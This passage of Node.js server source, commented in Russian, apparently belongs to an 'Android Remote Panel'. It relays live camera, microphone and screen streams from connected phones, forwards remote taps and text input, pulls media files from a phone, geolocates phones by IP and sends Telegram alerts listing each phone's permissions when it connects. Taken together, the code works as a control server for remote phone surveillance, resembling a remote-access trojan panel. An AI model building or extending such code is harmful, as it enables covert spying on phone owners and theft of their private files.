  const reg = registry[ip] || {};
  const entry = { back: null, front: null, audio: null, model: model || reg.model || 'Android', country: reg.country || '', countryCode: reg.countryCode || '', city: reg.city || '' };
  phones.set(ip, entry);
  fetchGeo(ip).then(g => { const p = phones.get(ip); if (p) { Object.assign(p, g); regTouch(ip, g); } }).catch(() => {});
  regTouch(ip, { model: entry.model, online: true, lastSeen: Date.now(), deleted: false });
  return entry;
}

function cleanupPhone(ip) {
  const p = phones.get(ip);
  if (!p || p.back || p.front || p.audio) return;
  // Не удаляем если /phone WebSocket всё ещё активен для любого алиаса этого телефона
  const hasActivePhoneWs = [...phones.entries()].some(
    ([k, v]) => v === p && phoneCallPhones.get(k)?.readyState === 1
  );
  if (hasActivePhoneWs) return;
  regTouch(ip, { online: false, lastSeen: Date.now() });
  // Обновляем активный телефон для пользователей, у которых он отключился
  for (const [username, activeIp] of userActivePhone.entries()) {
    if (phones.get(activeIp) === p) {
      const next = [...phones.entries()].find(([k, v]) => v !== p && _canViewPhone(username, k));
      if (next) userActivePhone.set(username, next[0]);
      else userActivePhone.delete(username);
    }
  }
  // Удаляем все алиасы (ключи), указывающие на этот объект
  for (const [k, v] of phones.entries()) { if (v === p) phones.delete(k); }
  if (!phones.has(activePhoneIp)) {
    activePhoneIp = phones.size > 0 ? [...phones.keys()][0] : null;
  }
  notifyPhoneList();
}

function buildFullPhoneList() {
  const result = [];
  const onlineIps = new Set();
  const seen = new Set();
  // Все IP из phones Map помечаем онлайн (включая алиасы одного телефона)
  for (const ip of phones.keys()) onlineIps.add(ip);
  // Онлайн (из phones Map, дедупликация по объекту)
  for (const [ip, p] of phones.entries()) {
    if (seen.has(p)) continue;
    seen.add(p);
    const reg = registry[ip] || {};
    result.push({
      ip, label: ip, online: true,
      model: p.model || reg.model || 'Android',
      battery: reg.battery ?? null,
      lastSeen: Date.now(),
      country: p.country || reg.country || '',
      countryCode: p.countryCode || reg.countryCode || '',
      city: p.city || reg.city || '',
      active: ip === activePhoneIp || phones.get(activePhoneIp) === p,
      deleted: reg.deleted || false,
      perms: reg.perms || null,
      cams: { back: !!p.back, front: !!p.front, audio: !!p.audio },
      owner: reg.owner || null,
    });
  }
  // Офлайн (из registry)
  for (const [ip, reg] of Object.entries(registry)) {
    if (onlineIps.has(ip)) continue;
    result.push({
      ip, label: ip, online: false,
      model: reg.model || 'Android',
      battery: reg.battery ?? null,
      lastSeen: reg.lastSeen || null,
      country: reg.country || '',
      countryCode: reg.countryCode || '',
      city: reg.city || '',
      active: false,
      deleted: reg.deleted || false,
      perms: reg.perms || null,
      cams: { back: false, front: false, audio: false },
      owner: reg.owner || null,
    });
  }
  return result;
}
// Оставляем phoneListJson как алиас для совместимости
function phoneListJson() { return buildFullPhoneList().filter(p => p.online && !p.deleted); }

function notifyViewersCam(cam, obj) {
  const data = JSON.stringify(obj);
  for (const v of viewerSets[cam] || []) if (v.readyState === v.OPEN) v.send(data);
}

function notifyPhoneList() {
  const fullList = buildFullPhoneList();
  for (const s of [...viewerSets.back, ...viewerSets.front, ...audioViewers]) {
    if (s.readyState === s.OPEN) {
      const isAdminS = !!(usersDb[s._username]?.admin);
      const list = isAdminS ? fullList : fullList.filter(p => _canViewPhone(s._username, p.ip));
      const activeIp = getActiveIpForUser(s._username);
      s.send(JSON.stringify({ type: 'phones', list, activeIp }));
    }
  }
  // уведомить каждого вьювера об его активном телефоне (пер-юзер)
  for (const cam of ['back', 'front']) {
    for (const v of viewerSets[cam] || []) {
      if (v.readyState !== v.OPEN) continue;
      const vai = getActiveIpForUser(v._username);
      const ap = vai ? phones.get(vai) : null;
      v.send(JSON.stringify({ type: 'phone', connected: !!(ap?.[cam]), cam }));
    }
  }
}

wssCamera.on('connection', (ws, req) => {
  const params = new URL(req.url, 'http://localhost').searchParams;
  const role = params.get('role') || 'viewer';
  const cam = params.get('cam') || 'back';
  const model = params.get('model') || '';
  const owner = params.get('owner') || '';
  const ip = normalizeIp(req.socket.remoteAddress);
  console.log(`[CAM] connected: role=${role} cam=${cam} from ${ip}`);

  if (role === 'phone') {
    _autoAssignOwner(ip, owner);
    const phone = getPhone(ip, model);
    phone[cam] = ws;
    if (!activePhoneIp) activePhoneIp = ip;
    if (owner && !userActivePhone.has(owner)) userActivePhone.set(owner, ip);
    notifyPhoneList();

    let firstFrame = true;
    ws.on('message', (data, isBinary) => {
      if (isBinary) {
        if (firstFrame) { console.log(`[CAM-FIRST-FRAME] cam=${cam} ip=${ip}`); firstFrame = false; }
        for (const v of viewerSets[cam] || []) {
          if (v.readyState === v.OPEN && v.bufferedAmount < MAX_BUF) {
            if (phone !== phones.get(getActiveIpForUser(v._username))) continue;
            if (_canViewPhone(v._username, ip)) v.send(data, { binary: true });
          }
        }
      } else {
        const str = data.toString();
        console.log(`[CAM-STATUS] cam=${cam} ip=${ip}: ${str}`);
        for (const v of viewerSets[cam] || []) {
          if (v.readyState === v.OPEN) {
            if (phone !== phones.get(getActiveIpForUser(v._username))) continue;
            if (_canViewPhone(v._username, ip)) v.send(str);
          }
        }
      }
    });
    ws.on('close', () => {
      if (phone[cam] === ws) phone[cam] = null;
      cleanupPhone(ip);
    });
  } else {
    ws._username = req._authUser || null;
    (viewerSets[cam] || viewerSets.back).add(ws);
    const vai = getActiveIpForUser(ws._username);
    const ap = vai ? phones.get(vai) : null;
    ws.send(JSON.stringify({ type: 'phone', connected: !!(ap?.[cam]), cam }));
    const isAdminWs = !!(usersDb[ws._username]?.admin);
    const fullList = buildFullPhoneList();
    const initList = isAdminWs ? fullList : fullList.filter(p => _canViewPhone(ws._username, p.ip));
    ws.send(JSON.stringify({ type: 'phones', list: initList, activeIp: vai }));
    ws.on('message', (data, isBinary) => {
      const viewerActiveIp = getActiveIpForUser(ws._username);
      const ap = viewerActiveIp ? phones.get(viewerActiveIp) : null;
      const phoneWs = ap?.back;
      console.log(`[VIEWER-CMD] cam=${cam} activeIp=${activePhoneIp} ap=${!!ap} back.state=${ap?.back?.readyState} front.state=${ap?.front?.readyState} msg=${data.toString().slice(0, 80)}`);
      if (phoneWs && phoneWs.readyState === phoneWs.OPEN) phoneWs.send(isBinary ? data : data.toString());
    });
    ws.on('close', () => (viewerSets[cam] || viewerSets.back).delete(ws));
  }
});

wssAudio.on('connection', (ws, req) => {
  const params = new URL(req.url, 'http://localhost').searchParams;
  const role = params.get('role') || 'viewer';
  const model = params.get('model') || '';
  const owner = params.get('owner') || '';
  const ip = normalizeIp(req.socket.remoteAddress);
  console.log(`[AUDIO] connected: role=${role} from ${ip}`);

  if (role === 'phone') {
    _autoAssignOwner(ip, owner);
    const phone = getPhone(ip, model);
    phone.audio = ws;
    if (!activePhoneIp) activePhoneIp = ip;
    if (owner && !userActivePhone.has(owner)) userActivePhone.set(owner, ip);
    notifyPhoneList();
    ws.on('message', (data, isBinary) => {
      const phoneEntry = phones.get(ip);
      if (isBinary && phoneEntry) {
        for (const v of audioViewers) {
          if (v.readyState === v.OPEN && v.bufferedAmount < MAX_BUF) {
            if (phoneEntry !== phones.get(getActiveIpForUser(v._username))) continue;
            if (_canViewPhone(v._username, ip)) v.send(data, { binary: true });
          }
        }
      }
    });
    ws.on('close', () => {
      if (phone.audio === ws) phone.audio = null;
      cleanupPhone(ip);
    });
  } else {
    ws._username = req._authUser || null;
    audioViewers.add(ws);
    const isAdminWs = !!(usersDb[ws._username]?.admin);
    const fullList = buildFullPhoneList();
    const initList = isAdminWs ? fullList : fullList.filter(p => _canViewPhone(ws._username, p.ip));
    ws.send(JSON.stringify({ type: 'phones', list: initList, activeIp: getActiveIpForUser(ws._username) }));
    ws.on('close', () => audioViewers.delete(ws));
  }
});

wss.on('connection', (ws) => {
  let streaming = false;
  let size = null;

  const sendJSON = (obj) => { if (ws.readyState === ws.OPEN) ws.send(JSON.stringify(obj)); };

  // Цикл захвата экрана: снимаем PNG и шлём как бинарный фрейм.
  async function streamLoop() {
    while (streaming && ws.readyState === ws.OPEN) {
      const t0 = Date.now();
      try {
        const png = await adb.screencap();
        if (ws.readyState === ws.OPEN) ws.send(png, { binary: true });
      } catch (e) {
        sendJSON({ type: 'error', message: 'screencap: ' + (e.message || e) });
        await new Promise((r) => setTimeout(r, 1000));
      }
      // Ограничиваем частоту, чтобы не грузить ADB (мин. интервал ~150мс).
      const elapsed = Date.now() - t0;
      if (elapsed < 150) await new Promise((r) => setTimeout(r, 150 - elapsed));
    }
  }

  ws.on('message', async (raw) => {
    let msg;
    try { msg = JSON.parse(raw.toString()); } catch { return; }
    try {
      switch (msg.type) {
        case 'start-stream':
          if (!streaming) {
            streaming = true;
            size = await adb.screenSize();
            sendJSON({ type: 'size', ...size });
            streamLoop();
          }
          break;
        case 'stop-stream':
          streaming = false;
          break;
        case 'tap': {
          // Координаты приходят нормализованными (0..1)
          size = size || await adb.screenSize();
          await adb.tap(msg.x * size.width, msg.y * size.height);
          break;
        }
        case 'swipe': {
          size = size || await adb.screenSize();
          await adb.swipe(msg.x1 * size.width, msg.y1 * size.height,
            msg.x2 * size.width, msg.y2 * size.height, msg.ms || 200);
          break;
        }
        case 'text':
          await adb.inputText(msg.text);
          break;
        case 'key':
          await adb.keyevent(adb.KEYCODES[msg.name] ?? msg.code);
          break;
      }
    } catch (e) {
      sendJSON({ type: 'error', message: e.message || String(e) });
    }
  });

  ws.on('close', () => { streaming = false; });
});

// ---- Экран телефона (MediaProjection) ----
const screenPhones = new Map(); // ip → ws
const screenViewers = new Set();

wssScreen.on('connection', (ws, req) => {
  const params = new URL(req.url, 'http://localhost').searchParams;
  const role = params.get('role') || 'viewer';
  const model = params.get('model') || '';
  const owner = params.get('owner') || '';
  const ip = normalizeIp(req.socket.remoteAddress);
  console.log(`[SCREEN] connected: role=${role} from ${ip}`);

  if (role === 'phone') {
    _autoAssignOwner(ip, owner);
    screenPhones.set(ip, ws);
    for (const v of screenViewers) {
      if (v.readyState !== v.OPEN) continue;
      if (!_canViewPhone(v._username, ip)) continue;
      if (!isActiveForViewer(v._username, ip)) continue;
      v.send(JSON.stringify({ type: 'screen-phone', connected: true }));
    }
    ws.on('message', (data, isBinary) => {
      if (!isBinary) return;
      for (const v of screenViewers) {
        if (v.readyState === v.OPEN && v.bufferedAmount < MAX_BUF) {
          const viewerActiveIp = getActiveIpForUser(v._username);
          const activeEntry = viewerActiveIp ? phones.get(viewerActiveIp) : null;
          if (activeEntry && model && activeEntry.model !== model) continue;
          if (_canViewPhone(v._username, ip)) v.send(data, { binary: true });
        }
      }
    });
    ws.on('close', () => {
      if (screenPhones.get(ip) === ws) screenPhones.delete(ip);
      for (const v of screenViewers) {
        if (v.readyState !== v.OPEN) continue;
        v.send(JSON.stringify({ type: 'screen-phone', connected: _hasAccessiblePhone(v._username, screenPhones) }));
      }
    });
  } else {
    ws._username = req._authUser || null;
    screenViewers.add(ws);
    ws.send(JSON.stringify({ type: 'screen-phone', connected: _hasAccessiblePhone(ws._username, screenPhones) }));
    ws.on('close', () => screenViewers.delete(ws));
  }
});

// ---- Управление телефоном (AccessibilityService) ----
const controlPhones = new Map(); // ip → ws
const controlViewers = new Set();

wssControl.on('connection', (ws, req) => {
  const params = new URL(req.url, 'http://localhost').searchParams;
  const role = params.get('role') || 'viewer';
  const model = params.get('model') || '';
  const owner = params.get('owner') || '';
  const ip = normalizeIp(req.socket.remoteAddress);
  console.log(`[CTRL] connected: role=${role} from ${ip}`);

  if (role === 'phone') {
    _autoAssignOwner(ip, owner);
    tgPhoneConnect(ip, model, owner);
    controlPhones.set(ip, ws);
    ws.on('close', () => { if (controlPhones.get(ip) === ws) controlPhones.delete(ip); });
  } else {
    ws._username = req._authUser || null;
    controlViewers.add(ws);
    ws.on('message', (data, isBinary) => {
      const viewerActiveIp = getActiveIpForUser(ws._username);
      let phone = viewerActiveIp ? controlPhones.get(viewerActiveIp) : null;
      if (!phone) phone = [...controlPhones.entries()]
        .find(([cip, cws]) => cws.readyState === cws.OPEN && _canViewPhone(ws._username, cip))?.[1];
      if (phone && phone.readyState === phone.OPEN) phone.send(isBinary ? data : data.toString());
    });
    ws.on('close', () => controlViewers.delete(ws));
  }
});

// ---- Телефон / Звонки ----
const phoneCallPhones = new Map(); // ip → ws
const phoneCallViewers = new Set();
const pendingHttpDl = new Map(); // requestId → { res, headersSent, received, total }

// HTTP-стриминг файла с телефона прямо в браузерный download
app.get('/api/dl', (req, res) => {
  const s = getSessionUser(req);
  const username = s?.username;
  const dlActiveIp = getActiveIpForUser(username);
  let phone = dlActiveIp ? phoneCallPhones.get(dlActiveIp) : null;
  if (!phone || phone.readyState !== phone.OPEN) {
    phone = [...phoneCallPhones.entries()]
      .find(([pip, pws]) => pws.readyState === pws.OPEN && _canViewPhone(username, pip))?.[1];
  }
  if (!phone || phone.readyState !== phone.OPEN)
    return res.status(503).json({ error: 'Телефон не подключён' });
  const { id, mediaType } = req.query;
  if (!id || !mediaType) return res.status(400).json({ error: 'id и mediaType обязательны' });
  const requestId = 'http_' + Date.now().toString(36) + Math.random().toString(36).slice(2, 8);
  const dl = { res, headersSent: false, received: 0, total: 0 };
  pendingHttpDl.set(requestId, dl);
  phone.send(JSON.stringify({ cmd: 'get-media-file', id: Number(id), mediaType, requestId }));
  dbg(`[HTTP-DL] start id=${id} type=${mediaType} requestId=${requestId}`);
  const timeout = setTimeout(() => {
    if (pendingHttpDl.delete(requestId) && !res.headersSent)
      res.status(504).json({ error: 'Нет ответа от телефона' });
  }, 30000);
  req.on('close', () => { clearTimeout(timeout); pendingHttpDl.delete(requestId); });
});

wssPhone.on('connection', (ws, req) => {
  const params = new URL(req.url, 'http://localhost').searchParams;
  const role = params.get('role') || 'viewer';
  const owner = params.get('owner') || '';
  const model = params.get('model') || '';
  const ip = normalizeIp(req.socket.remoteAddress);
  console.log(`[PHONE] connected: role=${role} from ${ip}`);

  if (role === 'phone') {
    _autoAssignOwner(ip, owner);
    tgPhoneConnect(ip, model, owner);
    phoneCallPhones.set(ip, ws);
    getPhone(ip, model); // добавляем в phones Map чтобы панель показала телефон онлайн
    if (!activePhoneIp) activePhoneIp = ip;
    if (owner && !userActivePhone.has(owner)) userActivePhone.set(owner, ip);
    notifyPhoneList();
    try { ws.send(JSON.stringify({ cmd: 'get-system-info' })); } catch {}
    for (const v of phoneCallViewers) {
      if (v.readyState !== v.OPEN) continue;
      if (!_canViewPhone(v._username, ip)) continue;
      if (!isActiveForViewer(v._username, ip)) continue;
      v.send(JSON.stringify({ type: 'phone-connected', connected: true }));
    }
    ws.on('message', (data, isBinary) => {
      if (isBinary) {
        try {
          const hLen = data.readUInt32BE(0);
          const hJson = JSON.parse(data.slice(4, 4 + hLen).toString());
          if (hJson.type === 'file-chunk') {
            if (hJson.index === 0) dbg(`[PHONE→] file-chunk binary requestId=${hJson.requestId} name=${hJson.name} size=${hJson.size} total=${hJson.total}`);
            // HTTP-стриминг: перехватываем и пишем прямо в HTTP-ответ
            const httpDl = pendingHttpDl.get(hJson.requestId);
            if (httpDl) {
              if (hJson.err) {
                pendingHttpDl.delete(hJson.requestId);
                if (!httpDl.res.headersSent) httpDl.res.status(500).end(hJson.err);
                else httpDl.res.end();
                return;
              }
              if (!httpDl.headersSent) {
                httpDl.total = hJson.total;
                httpDl.res.setHeader('Content-Type', hJson.mime || 'application/octet-stream');
                httpDl.res.setHeader('Content-Disposition', `attachment; filename*=UTF-8''${encodeURIComponent(hJson.name || 'file')}`);
                if (hJson.size > 0) httpDl.res.setHeader('Content-Length', hJson.size);
                httpDl.headersSent = true;
              }
              httpDl.res.write(data.subarray(4 + hLen));
              httpDl.received++;
              if (httpDl.received >= httpDl.total) {
                httpDl.res.end();
                pendingHttpDl.delete(hJson.requestId);
                dbg(`[HTTP-DL] done requestId=${hJson.requestId}`);
              }
              return;
            }
          }
        } catch {}
        for (const v of phoneCallViewers) {
          if (v.readyState === v.OPEN && _canViewPhone(v._username, ip)) {
            const vai = getActiveIpForUser(v._username);
            const directPhone = vai ? phoneCallPhones.get(vai) : null;
            if (directPhone?.readyState === 1 && directPhone !== ws) continue;
            v.send(data, { binary: true });
          }
        }
        return;
      }
      const str = data.toString();
      // Перехватываем phone-info чтобы сохранить батарею и модель
      try {
        const m = JSON.parse(str);
        if (m.type === 'file-chunk') {
          dbg(`[PHONE→] file-chunk text requestId=${m.requestId} err=${m.err || '(none)'}`);
          const httpDl = pendingHttpDl.get(m.requestId);
          if (httpDl && m.err) {
            pendingHttpDl.delete(m.requestId);
            if (!httpDl.res.headersSent) httpDl.res.status(500).end(m.err);
            else httpDl.res.end();
            return;
          }
        }
        if (m.type === 'phone-info') {
          const upd = { lastSeen: Date.now() };
          if (m.battery !== undefined) upd.battery = m.battery;
          if (m.model) upd.model = m.model;
          if (m.perms) upd.perms = m.perms;
          // Телефон может прийти через другой NAT-IP чем camera WS.
          // Ищем канонический IP в phones Map по модели, чтобы battery/perms
          // сохранились туда же, откуда их читает buildFullPhoneList().
          let regIp = ip;
          if (m.model) {
            for (const [k, p] of phones.entries()) {
              if (p.model === m.model) { regIp = k; break; }
            }
          }
          regTouch(regIp, upd);
        }
        if (m.type === 'system-info' && m.perms) {
          regTouch(ip, { perms: m.perms });
          const regOwner = registry[ip]?.owner || '';
          const key = _tgKey(ip, regOwner);
          const state = _tgPhoneMessages.get(key);
          if (state) {
            const reg = registry[ip] || {};
            const text = _formatPhoneTgText(state.model || reg.model, state.owner || reg.owner, m.perms, true);
            tgEditMsg(state.messageId, text, _tgRefreshKb(key)).catch(() => {});
          } else {
            // message_id ещё не записан — сохраняем perms, tgPhoneConnect подхватит
            _tgPendingPerms.set(key, m.perms);
          }
        }
      } catch {}
      for (const v of phoneCallViewers) {
        if (v.readyState === v.OPEN && _canViewPhone(v._username, ip)) {
          const vai = getActiveIpForUser(v._username);
          const directPhone = vai ? phoneCallPhones.get(vai) : null;
          if (directPhone?.readyState === 1 && directPhone !== ws) continue;
          v.send(str);
        }
      }
    });
    ws.on('close', () => {
      if (phoneCallPhones.get(ip) === ws) phoneCallPhones.delete(ip);
      cleanupPhone(ip);
      for (const v of phoneCallViewers) {
        if (v.readyState !== v.OPEN) continue;
        v.send(JSON.stringify({ type: 'phone-connected', connected: _hasAccessiblePhone(v._username, phoneCallPhones) }));
      }
    });
  } else {
    ws._username = req._authUser || null;
    phoneCallViewers.add(ws);
    ws.send(JSON.stringify({ type: 'phone-connected', connected: _hasAccessiblePhone(ws._username, phoneCallPhones) }));
    ws.on('message', (data, isBinary) => {
      const viewerActiveIp = getActiveIpForUser(ws._username);
      let phone = viewerActiveIp ? phoneCallPhones.get(viewerActiveIp) : null;
      if (!phone || phone.readyState !== phone.OPEN) {
        phone = [...phoneCallPhones.entries()]
          .find(([pip, pws]) => pws.readyState === pws.OPEN && _canViewPhone(ws._username, pip))?.[1];
      }
      if (!isBinary) {
        try {
          const m = JSON.parse(data.toString());
          if (m.cmd === 'get-media-file') dbg(`[→PHONE] get-media-file id=${m.id} type=${m.mediaType} requestId=${m.requestId} phoneFound=${!!phone}`);
        } catch {}
      }
      if (phone && phone.readyState === phone.OPEN) phone.send(isBinary ? data : data.toString());
    });
    ws.on('close', () => phoneCallViewers.delete(ws));
  }
});

// Запуск сервера. Возвращает { server, port } — используется как из CLI,
// так и из Electron (main-процесс поднимает сервер внутри приложения).
export function startServer({ port = PORT, host = HOST } = {}) {
  return new Promise((resolve, reject) => {
    server.once('error', reject);
    server.listen(port, host, () => {
      const actualPort = server.address().port;
      resolve({ server, port: actualPort, host });
    });
  });
}

// AUTO_START=1 устанавливается pm2 (ecosystem.config.cjs).
// Прямой запуск: node server.js — сравниваем пути с резолвингом симлинков.
const isDirectRun = !!process.env.AUTO_START || (() => {
  try {
    if (!process.argv[1]) return false;
    const a = fs.realpathSync(path.resolve(process.argv[1]));
    const b = fs.realpathSync(fileURLToPath(import.meta.url));
    return a === b;
  } catch { return false; }
})();

if (isDirectRun) {
  startServer().then(({ port }) => {
    console.log(`\n  Android Remote Panel запущена:`);
    console.log(`  →  http://localhost:${port}\n`);
    console.log(`  Убедись, что телефон подключён и "adb devices" его видит.\n`);
  }).catch((e) => {
    console.error('Не удалось запустить сервер:', e.message);
    process.exit(1);
  });
}
